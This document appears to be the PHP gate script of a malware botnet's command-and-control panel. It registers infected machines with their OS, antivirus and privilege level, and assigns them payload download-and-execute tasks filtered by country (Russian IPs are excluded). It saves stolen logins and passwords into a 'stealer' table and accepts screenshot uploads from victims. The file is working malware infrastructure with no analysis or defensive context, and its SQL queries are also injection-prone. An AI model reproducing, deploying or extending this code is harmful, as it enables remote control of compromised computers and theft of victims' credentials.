<?php

   error_reporting( 0 );

   if ( $_POST["vs"] )
   {
      if ( !preg_match( '/^[0-9,\.\s!&]{4}$/', $_POST['vs'] ) )
         die;
   }

   if ( $_POST["sd"] )
   {
      if ( !preg_match( '/^[0-9a-z]{6}$/', $_POST['sd'] ) )
         die;
   }

   if ( $_POST["ar"] )
   {
      if ( !preg_match( '/^[0-9]{1}$/', $_POST['ar'] ) )
         die;
   }

   if ( $_POST["lv"] )
   {
      if ( !preg_match( '/^[0-9]{1}$/', $_POST['lv'] ) )
         die;
   }

   if ( $_POST["bi"] )
   {
      if ( !preg_match( '/^[0-9]{1}$/', $_POST['bi'] ) )
         die;
   }

   if ( $_POST["os"] )
   {
      if ( !preg_match( '/^[0-9]{1,2}$/', $_POST['os'] ) )
         die;
   }

   if ( $_POST["av"] )
   {
      if ( !preg_match( '/^[0-9]{1,2}$/', $_POST['av'] ) )
         die;
   }

   if ( $_POST["pc"] )
   {
      if ( strlen( $_POST["pc"] ) > 32 )
         die;
   }

   if ( $_POST["un"] )
   {
      if ( strlen( $_POST["un"] ) > 32 )
         die;
   }

   if ( $_POST["dm"] )
   {
      if ( strlen( $_POST["dm"] ) > 32 )
         die;
   }

   Function GetFileName( $FileName ) 
   {    
      return substr( $FileName, 0, strrpos( $FileName, "." ) );
   }

   Function GetFileExtension( $FileName ) 
   {
      return end( explode( ".", $FileName ) );
   }

   function aGetCountryIndex( $ip )
   {
      include_once( "F.st/geo_ip.php" );
      $geoip = geo_ip::getInstance( "F.st/geo_ip.dat" );
      return $geoip -> lookupCountryCode( $ip );
   }

   function aGetCountry( $ip )
   {
      include_once( "F.st/geo_ip.php" );
      $geoip = geo_ip::getInstance( "F.st/geo_ip.dat" );
      return $geoip -> lookupCountryName( $ip );
   }

   function GetIP() 
   {
      if ( !empty( $_SERVER["HTTP_CLIENT_IP"] ) ) 
      {
         $ip = $_SERVER["HTTP_CLIENT_IP"];
      } 
      elseif ( !empty( $_SERVER["HTTP_X_FORWARDED_FOR"] ) ) 
      {
         $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
      } 
      else 
      {
         $ip = $_SERVER["REMOTE_ADDR"];
      }
      
      return $ip;
   }

   function strfix( $str )
   {
      return str_replace( "'", "", $str );
   }

   function IncreaseCount( $taskid, $unitid, $type )
   {

      if ( $type == "exec" )
      {
         $tp = "0";
      }

      if ( $type == "error" )
      {
         $tp = "1";
      }

      if ( $type == "error2" )
      {
         $tp = "2";
      }
      
      $taskid = substr( $taskid, 0, -3 );
      $taskid = strfix( $taskid );
      $unitid = strfix( $unitid );	   
      $type = strfix( $type );	
      $s_time = time();

      include( "Cfg/Config.php" );
      mysql_connect( $conf["dbhost"], $conf["dbuser"], $conf["dbpass"] );

      mysql_select_db( $conf["dbname"] );
      mysql_query( "UPDATE `tasks` SET `$type` = `$type` + 1 WHERE `id` = '" . $taskid . "' LIMIT 1" );	

      mysql_query( "INSERT INTO results ( time, id, tid, res ) VALUES ( '$s_time', '$unitid', '$taskid', '$tp' )" );    
      mysql_close();  
   }

   function GetTaskContent( $unit_id ) 
   {
      $bot_country = aGetCountryIndex( GetIP() );

      if ( $bot_country == "RU" )
      die;
         
      include( "Cfg/Config.php" );
      mysql_connect( $conf["dbhost"], $conf["dbuser"], $conf["dbpass"] );
      mysql_select_db( $conf["dbname"] );

      $sql = mysql_query( "SELECT * FROM `tasks` WHERE `status`='1' AND `id` NOT IN ( SELECT `task_id` FROM `tasks_exec` WHERE `unitid`='" . $unit_id . "' AND `exec`='1' ) ORDER BY id ASC" ); 

      while ( $task = mysql_fetch_assoc( $sql ) )
      {
         if( $task['arc'] < 2 )   
         {
            if( $task['arc'] != '' && $task['arc'] != $_POST["bi"] )
               continue;
         }

         if( $task['units'] != '' && $task['units'] != $unit_id )
            continue;

         if ( $task['country'] != '' && strpos( $task['country'], $bot_country ) === false )
             continue;
         
         if (!empty($task['path_rc4'])) 
         {
            $res .= $task['id'] . $task['run'] . $task['filetype'] . $task['folder'] . $task['path_rc4'] . "#";
         }
         else
         {
            $res .= $task['id'] . $task['run'] . $task['filetype'] . $task['folder'] . $task['path'] . "#";
         }
         
         mysql_query( "UPDATE `tasks` SET `loads`=`loads` + 1, `status`= IF (`loads` >= `tlimit` and `tlimit` <> 0 ,0 , `status` )  WHERE `id` = '" . $task['id'] . "' LIMIT 1" );											
         mysql_query( "INSERT `tasks_exec` VALUES ( null, '" . $task['id'] . "', '" . $unit_id . "', '1' )" );				
      }
      
      mysql_close();

      return $res;
   }

   function AddToCredBase( $s_soft, $s_type, $s_host, $s_login, $s_pass ) 
   { 
      $s_time = time();
      $s_id = $_POST["id"];
      $s_hash = md5( $s_id . $s_type . $s_host . $s_login . $s_pass );
      include( "Cfg/Config.php" );
      mysql_connect( $conf["dbhost"], $conf["dbuser"], $conf["dbpass"] );
      mysql_select_db( $conf["dbname"] );
      mysql_query( "INSERT INTO stealer ( hash, id, soft, time, type, host, login, password ) VALUES ( '$s_hash', '$s_id', '$s_soft', '$s_time', '$s_type', '$s_host', '$s_login', '$s_pass' )" );       
      mysql_close();
   }

   function Parse_2( $string, $symbol ) 
   {
      $p2 = explode( $symbol, $string );
      AddToCredBase( $p2[0], $p2[1], $p2[2], $p2[3], $p2[4] );  
   }

   function Parse_1( $string, $symbol ) 
   { 
      $p1 = explode( $symbol, strfix( $string ) );

      for ( $c = -1; $c++ < strlen( $string ); )
      {
         if ( $p1[$c] <> '' )
         {
            Parse_2( $p1[$c], '|' ); 
         }         
      }
   }

   function AddToBase( $bot_id, $bot_sid, $bot_lv, $version, $ar, $bi, $os, $av, $pc, $un, $dm ) 
   { 
      $bot_id = strfix( $bot_id );
      $bot_sid = strfix( $bot_sid );
      $version = strfix( $version );
      $ar = strfix( $ar );
      $bi = strfix( $bi );
      $os = strfix( $os );
      $av = strfix( $av );
      $pc = strfix( $pc );
      $un = strfix( $un );
      $dm = strfix( $dm );

      $time = time();
      $bot_ip = GetIP();
      $country = aGetCountry( $bot_ip );

      switch ( $os ) 
      {
         case 1: $os = "Windows 10";
         break;
         case 2: $os = "Server 2016";
         break;
         case 3: $os = "Windows 8.1";
         break;
         case 4: $os = "Server 2012";
         break;
         case 5: $os = "Windows 8";
         break;
         case 6: $os = "Server 2012";
         break;
         case 7: $os = "Windows Vista";
         break;
         case 8: $os = "Server 2008";
         break;
         case 9: $os = "Windows 7";
         break;
         case 10: $os = "Server 2008 R2";
         break;
         case 11: $os = "Server 2003 R2";
         break;
         case 12: $os = "Windows XP";
         break;
         case 13: $os = "Server 2003";
         break;
         case 14: $os = "Windows XP SE";
         break;
         case 15: $os = "Server 2000";
         break;
         case 16: $os = "Server 2019";
         break;
         case 17: $os = "Server 2022";
         break;
         case 18: $os = "Windows 11";
         break;
      }

      switch ( $av ) 
      {
         case 0: $av = "N/A";
         break;
         case 1: $av = "Avast";
         break;
         case 2: $av = "Avira";
         break;
         case 3: $av = "Kaspersky";
         break;
         case 4: $av = "NOD32";
         break;
         case 5: $av = "Panda";
         break;
         case 6: $av = "DrWEB";
         break;
         case 7: $av = "AVG";
         break;
         case 8: $av = "360 TS";
         break;
         case 9: $av = "Bitdefender";
         break;
         case 10: $av = "Norton";
         break;
         case 11: $av = "Sophos";
         break;
         case 12: $av = "Comodo";
         break;
         case 13: $av = "WinDefender";
         break;
      }

      if ( $ar == 0 )
      {
         $ar = "User";
      }

      if ( $ar == 1 )
      {
         $ar = "Admin";
      }

      if ( $bi == 0 )
      {
         $bi = "x32";
      }

      if ( $bi == 1 )
      {
         $bi = "x64";
      }

      if ( $bot_sid == "" )
      {
         $bot_sid = "low_vers";
      }

      if ( $dm == "" )
      {
         $dm = "Workgroup";
      }

      include( "Cfg/Config.php" );
      mysql_connect( $conf["dbhost"], $conf["dbuser"], $conf["dbpass"] );
      mysql_select_db( $conf["dbname"] );

      list( $id, $online ) = mysql_fetch_array( mysql_query( "SELECT id, online FROM units WHERE id = '$bot_id' LIMIT 1" ) );  

      if ( $id ) 
      { 
         mysql_query( "UPDATE units SET ip = '$bot_ip', online = '$time', country = '$country', ar = '$ar', arch = '$bi', version = '$version', av = '$av', lv = '$lv' WHERE id = '$bot_id' LIMIT 1" );
      } 
      else 
      { 
         mysql_query( "INSERT INTO units ( id, sid, lv, ip, first_ip, online, country, ar, arch, version, os, av, pc, un, dm, reg ) VALUES ( '$bot_id', '$bot_sid', '$bot_lv', '$bot_ip', '$bot_ip', '$time', '$country', '$ar', '$bi', '$version', '$os', '$av', '$pc', '$un', '$dm', '$time' )" );       
      } 

      mysql_close();
   }

   if ( $_GET["scr"] ) 
   {
      if ( strcasecmp( GetFileExtension( $_FILES['data']['name'] ), 'jpg' ) == 0 )
      {
         move_uploaded_file( $_FILES['data']['tmp_name'], './Screen/'. substr( GetFileName( $_FILES['data']['name'] ) , 0, 12 ). '.jpg' ) or die( '' );
      }

      exit;
   }

   if ( $_POST["e0"] ) 
   {
      IncreaseCount( $_POST["e0"], $_POST["unit"], "error" );
      exit;
   }

   if ( $_POST["e1"] ) 
   {
      IncreaseCount( $_POST["e1"], $_POST["unit"], "error2" );
      exit;
   }

   if ( $_POST["d1"] ) 
   {
      IncreaseCount( $_POST["d1"], $_POST["unit"], "exec" );
      exit;
   }

   if ( $_POST["cred"] ) 
   {
      Parse_1( $_POST["cred"], ':::' );
      exit;
   }

   if ( $_POST["id"] && $_POST["vs"] && $_POST["un"] && $_POST["pc"] )
   {
      AddToBase( $_POST["id"], $_POST["sd"], $_POST["lv"], $_POST["vs"], $_POST["ar"], $_POST["bi"], $_POST["os"], $_POST["av"], iconv( "CP1251", "UTF-8", $_POST["pc"] ), iconv( "CP1251", "UTF-8", $_POST["un"] ), iconv( "CP1251", "UTF-8", $_POST["dm"] ) );           
      
      if ( $_POST["lv"] == 0 )
      {
         echo "<c>" . GetTaskContent( $_POST["id"] ) . "<d>";
      }

      exit;
   }

   function cPhpV()
   {
      $main_vers = substr( phpversion(), 0, 1 );
      $sub_vers = substr( phpversion(), 2, 1 );

      $pmess = "Incorrect PHP version, use 5.6 or lower";

      if ( $main_vers . $sub_vers > 56 )
      {
         echo $pmess;
         exit;
      }

   }  

   cPhpV();
   header( "Refresh: 1; url = Login.php" );
?>